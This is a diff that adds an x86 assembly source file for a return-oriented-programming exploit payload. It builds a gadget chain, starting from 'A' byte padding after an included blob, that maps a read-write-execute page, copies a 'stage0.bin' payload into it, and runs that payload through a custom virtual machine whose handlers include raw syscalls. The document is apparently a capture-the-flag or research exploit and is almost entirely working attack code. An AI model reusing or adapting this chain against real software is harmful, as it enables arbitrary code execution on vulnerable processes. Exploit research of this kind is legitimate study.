@@ -1,0 +1,644 @@
+.global _start
+
+#include "const.h"
+#include "gadgets.h"
+#include "macros.h"
+
+#define BREAK_INSN 0x080ba791
+
+#define VAR_I (SCRATCH+0)
+#define VAR_J (SCRATCH+4)
+
+#define VM_MEM 0xc0de0000
+#define VM_MEM_SIZE 0x8000
+#define VM_REGS (VM_MEM+VM_MEM_SIZE-0x1000)
+
+#define VM_REG(x) (VM_REGS+(x*4))
+
+#define REG_PC 14
+
+#define VM_REG_R0 VM_REG(0)
+#define VM_REG_R1 VM_REG(1)
+#define VM_REG_R2 VM_REG(2)
+
+#define VM_REG_SP VM_REG(12)
+#define VM_REG_LR VM_REG(13)
+#define VM_REG_PC VM_REG(REG_PC)
+
+#define VM_VARS (VM_REGS+(16*4))
+#define VM_VAR(x) (VM_VARS+(x*4))
+
+#define VM_OPCODE VM_VAR(0)
+#define VM_ARG_A VM_VAR(1)
+#define VM_ARG_B VM_VAR(2)
+#define VM_ARG_C VM_VAR(3)
+#define VM_ARG_IMM VM_VAR(4)
+#define VM_SKIP_PC_INC VM_VAR(5)
+#define VM_REG_ORIG_ADDR VM_VAR(6)
+#define VM_REG_ORIG_VAL VM_VAR(7)
+#define VM_REG_NEW_VAL VM_VAR(8)
+#define VM_CMP_RES VM_VAR(9)
+#define VM_REG_VAL_A VM_VAR(10)
+#define VM_REG_VAL_B VM_VAR(11)
+#define VM_REG_VAL_C VM_VAR(12)
+#define VM_REG_STORE_PTR VM_VAR(13)
+
+.macro VM_READREG n
+	READ32 VM_REG(\n)
+.endm
+
+.macro VM_ADDR addr
+	SET_EAX VM_MEM
+	.long G_POP_EDI
+	.long \addr
+	.long G_ADD_EAX_EDI_POP_EDI
+	.long 0x44444444
+.endm
+
+.macro VM_READREG_MEM8 n, offs
+	VM_READREG \n
+	.long G_POP_EDI
+	.long VM_MEM
+	.long G_ADD_EAX_EDI_POP_EDI
+	.long 0x44444444
+	.long G_POP_EDI
+	.long \offs
+	.long G_ADD_EAX_EDI_POP_EDI
+	.long 0x55555555
+	.long G_READ8
+.endm
+
+.macro VM_READREG_MEM16 n, offs
+	VM_READREG \n
+	.long G_POP_EDI
+	.long VM_MEM
+	.long G_ADD_EAX_EDI_POP_EDI
+	.long 0x44444444
+	.long G_POP_EDI
+	.long \offs
+	.long G_ADD_EAX_EDI_POP_EDI
+	.long 0x55555555
+	.long G_READ16
+.endm
+
+.macro VM_OP_ALU name, opcode, gadget
+	READ32 VM_OPCODE
+	IF_EQUAL \name\()_opcode, \opcode
+		READ32 VM_ARG_A
+		ANDVAL 0x10
+		IF_EQUAL \name\()_opcode_imm, 0x10
+			READ32 VM_ARG_A
+			ANDVAL 0x0f
+			WRITE32_EAX VM_ARG_A
+			MULVAL 4
+
+			ADD_EAX VM_REGS
+			WRITE32_EAX VM_REG_ORIG_ADDR
+
+			READA
+			WRITE32_EAX VM_REG_ORIG_VAL
+
+			READ32 VM_ARG_IMM
+			MOVCNT
+		ELSE \name\()_opcode_imm
+			READ32 VM_ARG_A
+			MULVAL 4
+			ADD_EAX VM_REGS
+			WRITE32_EAX VM_REG_ORIG_ADDR
+			READA
+			WRITE32_EAX VM_REG_ORIG_VAL
+
+			READ32 VM_ARG_B
+			MULVAL 4
+			ADD_EAX VM_REGS
+			READA
+			MOVCNT
+		ENDIF \name\()_opcode_imm
+
+		READ32 VM_REG_ORIG_VAL
+		\gadget
+
+		WRITE32_EAX VM_REG_NEW_VAL
+			
+		READ32 VM_REG_ORIG_ADDR
+		MOVADDR
+
+		READ32 VM_REG_NEW_VAL
+		WRITEADDR
+	ENDIF_SINGLE \name\()_opcode
+.endm
+
+.macro VM_OP_MOV opcode
+	READ32 VM_OPCODE
+	IF_EQUAL mov_opcode, \opcode
+		READ32 VM_ARG_A
+		ANDVAL 0x10
+		IF_EQUAL mov_opcode_imm, 0x10
+			READ32 VM_ARG_A
+			ANDVAL 0x0f
+			WRITE32_EAX VM_ARG_A
+			MULVAL 4
+
+			ADD_EAX VM_REGS
+			WRITE32_EAX VM_REG_ORIG_ADDR
+
+			READ32 VM_ARG_IMM
+			MOVCNT
+		ELSE mov_opcode_imm
+			READ32 VM_ARG_A
+			MULVAL 4
+			ADD_EAX VM_REGS
+			WRITE32_EAX VM_REG_ORIG_ADDR
+
+			READ32 VM_ARG_B
+			MULVAL 4
+			ADD_EAX VM_REGS
+			READA
+			MOVCNT
+		ENDIF mov_opcode_imm
+
+		SET_EAX 0
+		ADDCNT
+
+		WRITE32_EAX VM_REG_NEW_VAL
+			
+		READ32 VM_REG_ORIG_ADDR
+		MOVADDR
+
+		READ32 VM_REG_NEW_VAL
+		WRITEADDR
+	ENDIF_SINGLE mov_opcode
+.endm
+
+.macro VM_OP_CMP opcode
+	READ32 VM_OPCODE
+	IF_EQUAL cmp_opcode, \opcode
+		READ32 VM_ARG_A
+		ANDVAL 0x10
+		IF_EQUAL cmp_opcode_imm, 0x10
+			READ32 VM_ARG_A
+			ANDVAL 0x0f
+			WRITE32_EAX VM_ARG_A
+			MULVAL 4
+
+			ADD_EAX VM_REGS
+			WRITE32_EAX VM_REG_ORIG_ADDR
+
+			READ32 VM_ARG_IMM
+			MOVCNT
+		ELSE cmp_opcode_imm
+			READ32 VM_ARG_A
+			MULVAL 4
+			ADD_EAX VM_REGS
+			WRITE32_EAX VM_REG_ORIG_ADDR
+
+			READ32 VM_ARG_B
+			MULVAL 4
+			ADD_EAX VM_REGS
+			READA
+			MOVCNT
+		ENDIF cmp_opcode_imm
+
+		READ32 VM_REG_ORIG_ADDR
+		READA
+
+		IF_CNT_EQUAL cmp_check
+			WRITE32 VM_CMP_RES, 1
+		ELSE cmp_check
+			WRITE32 VM_CMP_RES, 0
+		ENDIF cmp_check
+		
+	ENDIF_SINGLE cmp_opcode
+.endm
+
+.macro VM_OP_BRANCH name, opcode, cmp_val
+	READ32 VM_OPCODE
+	IF_EQUAL \name\()_opcode, \opcode
+		READ32 VM_CMP_RES
+		IF_EQUAL \name\()_cmp_check, \cmp_val
+			READ32 VM_ARG_IMM
+			WRITE32_EAX VM_REG_PC
+
+			WRITE32 VM_SKIP_PC_INC, 1
+		ENDIF_SINGLE \name\()_cmp_check
+	ENDIF_SINGLE \name\()_opcode
+.endm
+
+.macro VM_OP_JMP opcode
+	READ32 VM_OPCODE
+	IF_EQUAL jmp_opcode, \opcode
+		READ32 VM_ARG_IMM
+		WRITE32_EAX VM_REG_PC
+
+		WRITE32 VM_SKIP_PC_INC, 1
+	ENDIF_SINGLE jmp_opcode
+.endm
+
+.macro VM_OP_CALL opcode
+	READ32 VM_OPCODE
+	IF_EQUAL call_opcode, \opcode
+		READ32 VM_REG_PC
+		ADD_EAX 4
+		WRITE32_EAX VM_REG_LR
+
+		READ32 VM_ARG_IMM
+		WRITE32_EAX VM_REG_PC
+
+		WRITE32 VM_SKIP_PC_INC, 1
+	ENDIF_SINGLE call_opcode
+.endm
+
+.macro VM_OP_RET opcode
+	READ32 VM_OPCODE
+	IF_EQUAL ret_opcode, \opcode
+		READ32 VM_REG_LR
+		WRITE32_EAX VM_REG_PC
+		WRITE32 VM_SKIP_PC_INC, 1
+	ENDIF_SINGLE ret_opcode
+.endm
+
+.macro VM_OP_SC opcode
+	READ32 VM_OPCODE
+	IF_EQUAL sc_opcode, \opcode
+		ADDR_EDX op_sc_a0
+		READ32 VM_REG_R0
+		.long G_MOV_PTR_EDX_EAX
+
+		ADDR_EDX op_sc_a1
+		READ32 VM_REG_R1
+		.long G_MOV_PTR_EDX_EAX
+
+		ADDR_EDX op_sc_a2
+		READ32 VM_REG_R2
+		.long G_MOV_PTR_EDX_EAX
+
+		.long G_POP_ECX_EBX
+		op_sc_a1:
+		.long 0
+		op_sc_a0:
+		.long 0
+		.long G_POP_EDX
+		op_sc_a2:
+		.long 0
+
+		READ32 VM_ARG_IMM
+		.long G_SYSCALL
+	ENDIF_SINGLE sc_opcode
+.endm
+
+.macro VM_OP_LOAD name, opcode, mask
+	READ32 VM_OPCODE
+	IF_EQUAL \name\()_opcode, \opcode
+		READ32 VM_ARG_A
+		MULVAL 4
+		ADD_EAX VM_REGS
+		WRITE32_EAX VM_REG_ORIG_ADDR
+
+		READ32 VM_ARG_B
+		MULVAL 4
+		ADD_EAX VM_REGS
+		READA
+		WRITE32_EAX VM_REG_VAL_B
+
+		READ32 VM_ARG_C
+		MULVAL 4
+		ADD_EAX VM_REGS
+		READA
+
+		MOVCNT
+		READ32 VM_REG_VAL_B
+		ADDCNT
+
+		ADD_EAX VM_MEM
+		READA
+
+		WRITE32_EAX VM_REG_ORIG_VAL
+
+		READ32 VM_REG_ORIG_ADDR
+		MOVADDR
+
+		READ32 VM_REG_ORIG_VAL
+		ANDVAL \mask
+
+		WRITEADDR
+	ENDIF_SINGLE \name\()_opcode
+.endm
+
+.macro VM_OP_LOAD_MEMOFFS name, opcode, mask
+	READ32 VM_OPCODE
+	IF_EQUAL \name\()_mem_opcode, \opcode
+		READ32 VM_ARG_A
+		RIGHTSHIFTVAL 4
+		MULVAL 4
+		ADD_EAX VM_REGS
+		WRITE32_EAX VM_REG_ORIG_ADDR
+
+		READ32 VM_ARG_A
+		ANDVAL 0x0f
+		MULVAL 4
+		ADD_EAX VM_REGS
+		READA
+		WRITE32_EAX VM_REG_VAL_B
+
+		READ32 VM_ARG_IMM
+		MOVCNT
+
+		READ32 VM_REG_VAL_B
+		ADDCNT
+
+		ADD_EAX VM_MEM
+		READA
+
+		WRITE32_EAX VM_REG_ORIG_VAL
+
+		READ32 VM_REG_ORIG_ADDR
+		MOVADDR
+
+		READ32 VM_REG_ORIG_VAL
+		ANDVAL \mask
+
+		WRITEADDR
+	ENDIF_SINGLE \name\()_mem_opcode
+.endm
+
+.macro VM_OP_STORE name, opcode, gadget
+	READ32 VM_OPCODE
+	IF_EQUAL \name\()_opcode, \opcode
+		READ32 VM_ARG_B
+		MULVAL 4
+		ADD_EAX VM_REGS
+		READA
+		WRITE32_EAX VM_REG_VAL_B
+
+		READ32 VM_ARG_C
+		MULVAL 4
+		ADD_EAX VM_REGS
+		READA
+		WRITE32_EAX VM_REG_VAL_C
+
+		READ32 VM_REG_VAL_B
+		MOVCNT
+		READ32 VM_REG_VAL_C
+		ADDCNT
+
+		ADD_EAX VM_MEM
+		WRITE32_EAX VM_REG_STORE_PTR
+
+		READ32 VM_ARG_A
+		MULVAL 4
+		ADD_EAX VM_REGS
+		READA
+		WRITE32_EAX VM_REG_VAL_B
+
+		READ32 VM_REG_STORE_PTR
+		MOVADDR
+		READ32 VM_REG_VAL_B
+
+		\gadget
+	ENDIF_SINGLE \name\()_opcode
+.endm
+
+.macro VM_OP_STORE_MEMOFFS name, opcode, gadget
+	READ32 VM_OPCODE
+	IF_EQUAL \name\()_mem_opcode, \opcode
+		READ32 VM_ARG_A
+		ANDVAL 0x0f
+		ADD_EAX VM_REGS
+		READA
+		WRITE32_EAX VM_REG_VAL_A
+
+		READ32 VM_ARG_IMM
+		MOVCNT
+
+		READ32 VM_REG_VAL_A
+		ADDCNT
+
+		ADD_EAX VM_MEM
+		WRITE32_EAX VM_REG_STORE_PTR
+
+		READ32 VM_ARG_A
+		RIGHTSHIFTVAL 4
+		MULVAL 4
+		ADD_EAX VM_REGS
+		READA
+
+		WRITE32_EAX VM_REG_VAL_A
+
+		READ32 VM_REG_STORE_PTR
+		MOVADDR
+		READ32 VM_REG_VAL_A
+
+		\gadget
+	ENDIF_SINGLE \name\()_mem_opcode
+.endm
+
+.macro VM_OP_SHIFT name, opcode, gadget
+	READ32 VM_OPCODE
+	IF_EQUAL \name\()_opcode, \opcode
+		READ32 VM_ARG_IMM
+
+		ADDR_EDX \name\()_shiftval
+		READ32 VM_ARG_IMM
+		.long G_MOV_PTR_EDX_EAX
+
+		READ32 VM_ARG_A
+		MULVAL 4
+		ADD_EAX VM_REGS
+		WRITE32_EAX VM_REG_STORE_PTR
+		READA
+
+		.long G_POP_ECX
+		\name\()_shiftval:
+		.long 0
+		.long \gadget
+
+		WRITE32_EAX VM_REG_VAL_A
+
+		READ32 VM_REG_STORE_PTR
+		MOVADDR
+		READ32 VM_REG_VAL_A
+
+		WRITEADDR
+	ENDIF_SINGLE \name\()_opcode
+.endm
+
+.macro VM_OP_PUSH opcode
+	READ32 VM_OPCODE
+	IF_EQUAL push_opcode, \opcode
+		SET_EAX VM_REG_SP
+		MOVADDR
+
+		SET_EAX 4
+		MOVCNT
+
+		SET_EAX VM_REG_SP
+		READA
+
+		SUBCNT
+		WRITEADDR
+
+		ADD_EAX VM_MEM
+		WRITE32_EAX VM_REG_ORIG_ADDR
+
+		READ32 VM_ARG_A
+		MULVAL 4
+		ADD_EAX VM_REGS
+		READA
+
+		WRITE32_EAX VM_REG_VAL_A
+
+		READ32 VM_REG_ORIG_ADDR
+		MOVADDR
+
+		READ32 VM_REG_VAL_A
+		WRITEADDR
+	ENDIF_SINGLE push_opcode
+.endm
+
+.macro VM_OP_POP opcode
+	READ32 VM_OPCODE
+	IF_EQUAL pop_opcode, \opcode
+		SET_EAX VM_REG_SP
+		READA
+		ADD_EAX VM_MEM
+		READA
+		WRITE32_EAX VM_REG_VAL_A
+
+		READ32 VM_ARG_A
+		MULVAL 4
+		ADD_EAX VM_REGS
+		MOVADDR
+
+		READ32 VM_REG_VAL_A
+		WRITEADDR
+
+		SET_EAX VM_REG_SP
+		MOVADDR
+
+		SET_EAX 4
+		MOVCNT
+
+		SET_EAX VM_REG_SP
+		READA
+
+		ADDCNT
+		WRITEADDR
+	ENDIF_SINGLE pop_opcode
+.endm
+
+.macro VM_OP_EXIT opcode
+	READ32 VM_OPCODE
+	IF_EQUAL exit_opcode, \opcode
+//		.long BREAK_INSN
+		SYSCALL3 NR_EXIT 666, 0, 0
+	ENDIF_SINGLE exit_opcode
+.endm
+
+.macro DECODE_INSN
+	VM_READREG_MEM8 REG_PC, 3
+	WRITE32_EAX VM_OPCODE
+	VM_READREG_MEM8 REG_PC, 2
+	WRITE32_EAX VM_ARG_A
+	VM_READREG_MEM8 REG_PC, 1
+	WRITE32_EAX VM_ARG_B
+	VM_READREG_MEM8 REG_PC, 0
+	WRITE32_EAX VM_ARG_C
+	VM_READREG_MEM16 REG_PC, 0
+	WRITE32_EAX VM_ARG_IMM
+.endm
+
+_start:
+// pad until start of ROP chain
+.incbin "./inc/h.bin"
+.rept 4
+	.byte 0x41
+.endr
+
+// PRINT_STRING welcome
+
+// mmap rwx page for VM
+ADDR_EBX mmap_arg
+SET_EAX 90
+.long G_SYSCALL
+
+// memset(vm_mem, 0, vm_code_size)
+FCALL3 F_MEMSET, VM_MEM, 0, VM_MEM_SIZE
+
+// memcpy(vm_mem, vm_code, vm_code_size);
+PATCHARGPTR 1, vm_code
+FCALL3 F_MEMCPY VM_MEM, 0, (vm_code_end-vm_code)
+
+
+// set SP=stack_top
+WRITE32 VM_REG_SP, (VM_REGS-VM_MEM)
+
+// WRITE32 VM_REG_SP, VM_MEM_SIZE
+
+
+vmloop:
+	// decode opcode and operands into temp vars
+	DECODE_INSN
+
+	// dont skip PC increment by default
+	WRITE32 VM_SKIP_PC_INC, 0 
+
+	// main instruction handling logic
+	VM_OP_ALU add, 0xa0, ADDCNT
+	VM_OP_ALU sub, 0xa1, SUBCNT
+	VM_OP_ALU xor, 0xa2, XORCNT
+	VM_OP_MOV 0xa3
+	VM_OP_CMP 0xb0
+	VM_OP_BRANCH beq, 0xc0, 1
+	VM_OP_BRANCH bne, 0xc1, 0
+	VM_OP_JMP 0xc2
+	VM_OP_CALL 0xc3
+	VM_OP_RET 0xd0
+	VM_OP_SC 0xd1
+
+	VM_OP_LOAD ldr, 0xe0, 0xffffffff
+	VM_OP_LOAD ldrh, 0xe4, 0xffff
+	VM_OP_LOAD ldrb, 0xe8, 0xff
+	VM_OP_LOAD_MEMOFFS ldr, 0xe1, 0xffffffff
+	VM_OP_LOAD_MEMOFFS ldrh, 0xe5, 0xffff
+	VM_OP_LOAD_MEMOFFS ldrb, 0xe9, 0xff
+
+	VM_OP_STORE str, 0xe2, WRITEADDR
+	VM_OP_STORE strh, 0xe6, WRITEADDR16
+	VM_OP_STORE strb, 0xea, WRITEADDR8
+	VM_OP_STORE_MEMOFFS str, 0xe3, WRITEADDR
+	VM_OP_STORE_MEMOFFS strh, 0xe7, WRITEADDR16
+	VM_OP_STORE_MEMOFFS strb, 0xeb, WRITEADDR8
+
+	VM_OP_SHIFT lsl, 0xf0, G_SHL_EAX_CL
+	VM_OP_SHIFT lsr, 0xf1, G_SHR_EAX_CL
+
+	VM_OP_PUSH 0xf2
+	VM_OP_POP 0xf3
+
+	VM_OP_EXIT 0xff
+
+	// END
+
+	// handle skip PC increment logic
+	READ32 VM_SKIP_PC_INC
+	IF_EQUAL check_skip_pc, 0
+		VM_READREG REG_PC
+		ADD_EAX 4
+		WRITE32_EAX VM_REG_PC
+	ENDIF_SINGLE check_skip_pc
+	
+LOOP vmloop
+
+SYSCALL3 NR_EXIT, 0, 0, 0
+
+mmap_arg:
+.long VM_MEM
+.long VM_MEM_SIZE
+.long 0x7
+.long 0x31
+.long 0
+.long 0
+
+vm_code:
+	.incbin "stage0.bin"
+vm_code_end:
